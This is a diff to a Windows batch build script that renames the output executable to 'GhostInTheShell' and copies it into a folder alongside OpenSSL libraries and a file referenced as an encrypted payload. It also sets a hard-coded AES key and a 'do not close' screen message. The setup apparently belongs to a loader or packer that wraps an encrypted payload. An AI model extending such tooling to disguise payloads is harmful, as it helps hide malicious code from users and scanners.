@@ -13,6 +13,7 @@ set AES_KEY=JustDoIt
 set SCREEN_TEXT=computing,do not close!!!\n
 ::false|true
 set SHOW_STDIO=true
+set APP_NAME=GhostInTheShell
 
 
 set COPY=copy /y 
@@ -53,12 +54,12 @@ exit
 
 echo PostCompile
 
-::%COPY% Config.h.tmp Config.h
-::%DEL% Config.h.tmp
+%COPY% Config.h.tmp Config.h
+%DEL% Config.h.tmp
 
-set BIN_DIR=%OUT_DIR%AppShell\
+set BIN_DIR=%OUT_DIR%%APP_NAME%\
 mkdir %BIN_DIR%
-%XCOPY% %OUT_DIR%AppShell.exe %BIN_DIR%
+%COPY% %OUT_DIR%AppShell.exe %BIN_DIR%%APP_NAME%
 %XCOPY% %OUT_DIR%libssl-1_1-x64.dll %BIN_DIR%
 %XCOPY% %OUT_DIR%libcrypto-1_1-x64.dll %BIN_DIR%
 %XCOPY% %ENCRYPTED_PAYLOAD% %BIN_DIR%
